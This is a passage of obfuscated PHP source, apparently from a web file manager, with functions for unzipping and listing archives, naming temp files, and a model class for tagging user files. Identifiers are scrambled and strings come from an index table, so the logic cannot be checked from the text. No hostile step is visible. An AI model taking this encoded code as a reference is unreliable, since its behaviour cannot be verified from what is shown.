$´ºÁÀŞ¥); if (!IO::exist($›µ›²ƒŠ)) { if ($ÚòÁ†±) { del_dir($ÚòÁ†±); } show_json(LNG($â¢÷È¯[1168]), !1); } if ($Ö¬–à || !$ÚòÁ†±) { if ($ÚòÁ†± && strstr($ÚòÁ†±, TEMP_FILES)) { $Ã¹Ùö„ = $´ºÁÀŞ¥ = array(); recursion_dir($ìõÒ¤ö, $Ã¹Ùö„, $´ºÁÀŞ¥, 0); foreach ($Ã¹Ùö„ as $‘¼¤ıÎø) { del_dir($‘¼¤ıÎø); } foreach ($´ºÁÀŞ¥ as $¶ö¿Âá’) { if ($¶ö¿Âá’ == $£éòÄ½­) { continue; } del_file($¶ö¿Âá’); } } return $›µ›²ƒŠ; } $âÖ¿‡Óö = self::pathFather($ÓçÑ³è[$â¢÷È¯[78]]); $ÙØÈµÄ = self::move($›µ›²ƒŠ, $âÖ¿‡Óö, $‡¨¹ıåÆ); if (!$ÙØÈµÄ) { del_dir($ÚòÁ†±); show_json(LNG($â¢÷È¯[1168]), !1); } del_dir($ÚòÁ†±); return $ÙØÈµÄ; } public static function unzip($ª²şùç, $˜ Šùş = "\162\x65\x70\154\x61\x63\x65") { $Á¦±º“¸ =& $_SERVER[® ¨Ä®ñ]; $éÅ»×ÓÒ = $ª²şùç[$Á¦±º“¸[78]]; $éÛ½¢ÖÇ = $ª²şùç[$Á¦±º“¸[1169]]; if (!($ˆ•Æíá = parent::info($éÅ»×ÓÒ))) { show_json(LNG($Á¦±º“¸[1170]), !1); } if (!($ØÌ×Ä£º = parent::infoFull($éÛ½¢ÖÇ))) { $éÛ½¢ÖÇ = parent::mkdir($éÛ½¢ÖÇ); $ØÌ×Ä£º = array($Á¦±º“¸[78] => $éÛ½¢ÖÇ); } else { if (isset($ØÌ×Ä£º[$Á¦±º“¸[394]]) && trim($ØÌ×Ä£º[$Á¦±º“¸[78]], $Á¦±º“¸[8]) != trim($éÛ½¢ÖÇ, $Á¦±º“¸[8])) { $œ§Ú¿ğš = KodIO::make($ØÌ×Ä£º[$Á¦±º“¸[489]]); $áœØÒÀ© = parent::fileNameAuto($œ§Ú¿ğš, $ØÌ×Ä£º[$Á¦±º“¸[32]], REPEAT_RENAME_FOLDER, !0); $éÛ½¢ÖÇ = parent::mkdir($œ§Ú¿ğš . $áœØÒÀ©); $ØÌ×Ä£º = array($Á¦±º“¸[78] => $éÛ½¢ÖÇ); } } $éÛ½¢ÖÇ = $ØÌ×Ä£º[$Á¦±º“¸[78]]; $²´„õïÍ = self::tmpFileName($ˆ•Æíá); $û©Îƒ¥µ = TEMP_FILES . $²´„õïÍ; del_dir($û©Îƒ¥µ); mk_dir($û©Îƒ¥µ); $·öäƒ‘¿ = self::fileExt($ˆ•Æíá); $Š§Ù¥ñ = $û©Îƒ¥µ . $Á¦±º“¸[10] . $·öäƒ‘¿; if (!@file_exists(self::iconvSystem($Š§Ù¥ñ))) { $–Ä±ø»Î = self::localFilePath($éÅ»×ÓÒ, $·öäƒ‘¿); $Š§Ù¥ñ = $–Ä±ø»Î ? $–Ä±ø»Î : parent::download($éÅ»×ÓÒ, $Š§Ù¥ñ); } $Š§Ù¥ñ = self::iconvSystem($Š§Ù¥ñ); $ºÕúËÜÛ = isset($ª²şùç[$Á¦±º“¸[1171]]) ? $ª²şùç[$Á¦±º“¸[1171]] : $Á¦±º“¸[1172]; $°äÂÅŒœ = KodArchive::extract($Š§Ù¥ñ, $û©Îƒ¥µ . $Á¦±º“¸[8], $ºÕúËÜÛ); self::archiveExt(); if (!$°äÂÅŒœ[$Á¦±º“¸[1173]]) { show_json($Á¦±º“¸[1174] . $°äÂÅŒœ[$Á¦±º“¸[1175]], !1); } Hook::trigger($Á¦±º“¸[1176], $û©Îƒ¥µ); recursion_dir($û©Îƒ¥µ, $¥È‚È¨©, $Ùëå„·, 0); $ÅˆÀºï© = array_merge($¥È‚È¨©, $Ùëå„·); foreach ($ÅˆÀºï© as $ó ß’Í·) { $ó ß’Í· = self::iconvApp($ó ß’Í·); self::move($ó ß’Í·, $éÛ½¢ÖÇ, $˜ Šùş); } del_dir($û©Îƒ¥µ); if (!$–Ä±ø»Î) { del_file($Š§Ù¥ñ); } return !0; } public static function unzipList($ÀÅÖØæ») { $¥ö—¤Íä =& $_SERVER[® ¨Ä®ñ]; $µ²¤¦ŠÃ = $ÀÅÖØæ»[$¥ö—¤Íä[78]]; $†ÛÍı÷ = isset($ÀÅÖØæ»[$¥ö—¤Íä[1177]]) ? $ÀÅÖØæ»[$¥ö—¤Íä[1177]] : -1; $ëÁ›¬¬à = 50000; if (request_url_safe($µ²¤¦ŠÃ)) { $Ş’ûˆœç = parse_url_query($µ²¤¦ŠÃ); if (!isset($Ş’ûˆœç[$¥ö—¤Íä[78]])) { show_json($¥ö—¤Íä[1178], !1); } } $£½á¹Ê = isset($Ş’ûˆœç) ? $Ş’ûˆœç[$¥ö—¤Íä[78]] : $µ²¤¦ŠÃ; $¯ß×ÎÈ¦ = self::info($£½á¹Ê); $Äá£œóÂ = self::fileExt($¯ß×ÎÈ¦); $ıñ¡øõ = self::tmpFileName($¯ß×ÎÈ¦); if (isset($Ş’ûˆœç)) { $‚àî£Öô = array($Ş’ûˆœç[$¥ö—¤Íä[78]], $Ş’ûˆœç[$¥ö—¤Íä[1177]], $Ş’ûˆœç[$¥ö—¤Íä[32]]); $‘ÜÔÛÏ« = md5(implode($¥ö—¤Íä[11], $‚àî£Öô)) . $¥ö—¤Íä[10] . get_path_ext($Ş’ûˆœç[$¥ö—¤Íä[32]]); } else { $‚àî£Öô = array($¯ß×ÎÈ¦[$¥ö—¤Íä[32]], $¯ß×ÎÈ¦[$¥ö—¤Íä[78]], $¯ß×ÎÈ¦[$¥ö—¤Íä[80]]); $‘ÜÔÛÏ« = md5(implode($¥ö—¤Íä[11], $‚àî£Öô)) . $¥ö—¤Íä[10] . $Äá£œóÂ; } if ($†ÛÍı÷ == -1) { $ŞØ½×ò = IO_PATH_SYSTEM_TEMP . "\x7a\151\160\126\x69\x65\x77\57{$ıñ¡øõ}\57{$‘ÜÔÛÏ«}\56\154\x6f\x67"; $³¾Ê–çì = self::infoFull($ŞØ½×ò); if ($³¾Ê–çì) { $ŞØ½×ò = $³¾Ê–çì[$¥ö—¤Íä[78]]; $“Ó«°¸ = self::getContent($ŞØ½×ò); if ($“Ó«°¸) { $€¯ÇûËô = json_decode($“Ó«°¸, !0); $€¯ÇûËô = is_array($€¯ÇûËô) ? $€¯ÇûËô : array(); if (count($€¯ÇûËô) >= $ëÁ›¬¬à) { show_json(sprintf(LNG($¥ö—¤Íä[1179]), count($€¯ÇûËô)), !1); } return $€¯ÇûËô; } } else { $ŞØ½×ò = self::mkfile($ŞØ½×ò); } } $ÆşˆñÍŒ = TEMP_FILES . $ıñ¡øõ; if (!is_dir($ÆşˆñÍŒ)) { mk_dir($ÆşˆñÍŒ); } $áòª¯¶ = $ÆşˆñÍŒ . $¥ö—¤Íä[8] . $‘ÜÔÛÏ«; if (!@file_exists(self::iconvSystem($áòª¯¶))) { if (isset($Ş’ûˆœç)) { url_request($µ²¤¦ŠÃ, $¥ö—¤Íä[1180], $áòª¯¶); } else { $â‰ õ‚Æ = self::localFilePath($µ²¤¦ŠÃ, $Äá£œóÂ); $áòª¯¶ = $â‰ õ‚Æ ? $â‰ õ‚Æ : self::download($µ²¤¦ŠÃ, $áòª¯¶); } } $áòª¯¶ = self::iconvSystem($áòª¯¶); if ($†ÛÍı÷ >= 0) { $áªÃÜ‰ = isset($ÀÅÖØæ»[$¥ö—¤Íä[1181]]) ? $ÀÅÖØæ»[$¥ö—¤Íä[1181]] : !1; $—ÀµÉá = isset($ÀÅÖØæ»[$¥ö—¤Íä[32]]) ? $ÀÅÖØæ»[$¥ö—¤Íä[32]] : $¥ö—¤Íä[12]; KodArchive::filePreview($áòª¯¶, $†ÛÍı÷, $áªÃÜ‰, $—ÀµÉá); self::archiveExt(); die; } $˜îµëİ„ = KodArchive::listContent($áòª¯¶); self::archiveExt(); del_dir($ÆşˆñÍŒ); if (!$˜îµëİ„[$¥ö—¤Íä[1173]]) { show_json($˜îµëİ„[$¥ö—¤Íä[1175]], !1); } $€¯ÇûËô = json_encode($˜îµëİ„[$¥ö—¤Íä[1175]]); self::setContent($ŞØ½×ò, $€¯ÇûËô); if (count($˜îµëİ„[$¥ö—¤Íä[1175]]) >= $ëÁ›¬¬à) { show_json(sprintf(LNG($¥ö—¤Íä[1179]), count($˜îµëİ„[$¥ö—¤Íä[1175]])), !1); } return $˜îµëİ„[$¥ö—¤Íä[1175]]; } private static function fileExt($ú÷Ø…²) { $™–²Ãƒ• =& $_SERVER[® ¨Ä®ñ]; $ÈªòïÒí = $ú÷Ø…²[$™–²Ãƒ•[167]]; if ($ÈªòïÒí == $™–²Ãƒ•[1182]) { $ÒæåË = $™–²Ãƒ•[1183]; if (substr($ú÷Ø…²[$™–²Ãƒ•[32]], -strlen($ÒæåË)) == $ÒæåË) { $ÈªòïÒí = $™–²Ãƒ•[1184]; } } self::archiveExt($ÈªòïÒí); return $ÈªòïÒí; } private static function zipFileList($Ô§›³çó, $ˆîó­¼¡ = false) { $È¶Á…¥˜ =& $_SERVER[® ¨Ä®ñ]; $‡ò¸‡ = array(); foreach ($Ô§›³çó as $ëŸ“èºƒ) { $İˆºÅÏ = $ëŸ“èºƒ[$È¶Á…¥˜[78]]; if ($ˆîó­¼¡) { $İˆºÅÏ = self::copy($ëŸ“èºƒ[$È¶Á…¥˜[78]], $ˆîó­¼¡, $È¶Á…¥˜[800]); } else { $€“ôÁ¢ = self::init($ëŸ“èºƒ[$È¶Á…¥˜[78]]); if ($€“ôÁ¢->getType() == $È¶Á…¥˜[107]) { $İˆºÅÏ = $€“ôÁ¢->path; } } if ($İˆºÅÏ && self::local()->exist($İˆºÅÏ)) { $‡ò¸‡[$ëŸ“èºƒ[$È¶Á…¥˜[78]]] = $İˆºÅÏ; } } if (!empty($‡ò¸‡)) { return array_values($‡ò¸‡); } show_json(LNG($È¶Á…¥˜[1148]), !1); } public static function tmpFileName($‚â‹ÒÂ) { $çÖŒ†–ì =& $_SERVER[® ¨Ä®ñ]; $ØÇÓ æ— = array($‚â‹ÒÂ[$çÖŒ†–ì[32]], $‚â‹ÒÂ[$çÖŒ†–ì[78]], $‚â‹ÒÂ[$çÖŒ†–ì[80]], $‚â‹ÒÂ[$çÖŒ†–ì[512]]); return md5(implode($çÖŒ†–ì[11], $ØÇÓ æ—)); } private static function localFilePath($¬Áªª›Ì, $ã·±ø) { $ÅÕğğ =& $_SERVER[® ¨Ä®ñ]; if ($ã·±ø == $ÅÕğğ[1185] && strtoupper(substr(PHP_OS, 0, 3)) == $ÅÕğğ[1186]) { return !1; } $İûÂ¥­¦ = KodIO::parse($¬Áªª›Ì); if ($İûÂ¥­¦[$ÅÕğğ[33]] == KodIO::KOD_SOURCE) { $‡Ş˜©ó = Model($ÅÕğğ[807])->fileInfoGet(KodIO::sourceID($¬Áªª›Ì)); if (!$‡Ş˜©ó[$ÅÕğğ[78]]) { show_json($ÅÕğğ[1187], !1); } $¬Áªª›Ì = $‡Ş˜©ó[$ÅÕğğ[78]]; } $öÌ²ôÙÔ = self::init($¬Áªª›Ì); if ($öÌ²ôÙÔ->pathParse[$ÅÕğğ[1135]]) { $¬Áªª›Ì = $öÌ²ôÙÔ->pathParse[$ÅÕğğ[1135]]; $öÌ²ôÙÔ = self::init($¬Áªª›Ì); } $†‡”ÆÏï = $öÌ²ôÙÔ->getType(); if ($†‡”ÆÏï == $ÅÕğğ[107] || $†‡”ÆÏï == $ÅÕğğ[1188]) { if (!$öÌ²ôÙÔ->exist($öÌ²ôÙÔ->path)) { show_json(LNG($ÅÕğğ[106]), !1); } return $öÌ²ôÙÔ->path; } return !1; } private static function archiveExt($åé¨É¸ = '') { $GLOBALS[$_SERVER[® ¨Ä®ñ][1189]] = $åé¨É¸; } } goto e´˜ƒÂ¿Íˆ; C¢×ŠŞÂŠÏ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\162\x5f\x66\141\x76"; protected function cacheFunctionAlias($ë™ÛÒ—³) { $ÂˆÛ££ =& $_SERVER[® ¨Ä®ñ]; return array($ÂˆÛ££[1915] => array(USER_ID, $ÂˆÛ££[1916])); } protected function listData() { $ÎşÌĞâ¿ =& $_SERVER[® ¨Ä®ñ]; $Û»ÖŞ¤› = array($ÎşÌĞâ¿[1630] => USER_ID, $ÎşÌĞâ¿[474] => array($ÎşÌĞâ¿[1919], 0)); $–­‚—³œ = $ÎşÌĞâ¿[1921]; $İ¢±”±ú = $this->field($–­‚—³œ)->where($Û»ÖŞ¤›)->order($ÎşÌĞâ¿[1922])->select(); return $İ¢±”±ú ? $İ¢±”±ú : array(); } protected function listByTag($²ıâ¿ŠÕ) { } protected function addToTag($ì×ä¸î’, $ë¯²šñß) { $ëïñ¼ó¡ =& $_SERVER[® ¨Ä®ñ]; if (!Model($ëïñ¼ó¡[2056])->listData($ë¯²šñß) || !Model($ëïñ¼ó¡[807])->pathInfo($ì×ä¸î’)) { return !1; } $×Á›á® = array($ëïñ¼ó¡[1630] => USER_ID, $ëïñ¼ó¡[474] => $ë¯²šñß, $ëïñ¼ó¡[413] => $ì×ä¸î’, $ëïñ¼ó¡[414] => $ëïñ¼ó¡[408], $ëïñ¼ó¡[412] => $ëïñ¼ó¡[12], $ëïñ¼ó¡[1811] => 0); if ($this->where($×Á›á®)->find()) { return !1; } return $this->add($×Á›á®); } protected function removeFromTag($Ó‹ßğ½Ë, $¦¸ª¥ê«) { $‡†ÓÏ•ı =& $_SERVER[® ¨Ä®ñ]; if (!Model($‡†ÓÏ•ı[2056])->listData($¦¸ª¥ê«)) { return !1; } if (is_array($Ó‹ßğ½Ë)) { $Ó‹ßğ½Ë = array($‡†ÓÏ•ı[7], $Ó‹ßğ½Ë); } $şÅßöÚ× = array($‡†ÓÏ•ı[1630] => USER_ID, $‡†ÓÏ•ı[474] => $¦¸ª¥ê«, $‡†ÓÏ•ı[414] => $‡†ÓÏ•ı[408], $‡†ÓÏ•ı[413] => $Ó‹ßğ½Ë); return $this->where($şÅßöÚ×)->delete(); } protected function removeByTag($–±²Ì) { $•â§¢²ã =& $_SERVER[® ¨Ä®ñ]; if (!$–±²Ì) { return !1; } $¡¿“ëİ¼ = array($•â§¢²ã[1630] => USER_ID, $•â§¢²ã[474] => $–±²Ì); return $this->where($¡¿“ëİ¼)->delete(); } protected function removeBySource($è§¢Ì«ô) { $‰•¢ÅÖÄ =& $_SERVER[® ¨Ä®ñ]; if (is_array($è§¢Ì«ô)) { $è§¢Ì«ô = array($‰•¢ÅÖÄ[7], $è§¢Ì«ô); } $ˆ¦ı¼ñ = array($‰•¢ÅÖÄ[1630] => USER_ID, $‰•¢ÅÖÄ[413] => $è§¢Ì«ô, $‰•¢ÅÖÄ[474] => array($‰•¢ÅÖÄ[998], 0)); return $this->where($ˆ¦ı¼ñ)->delete(); } }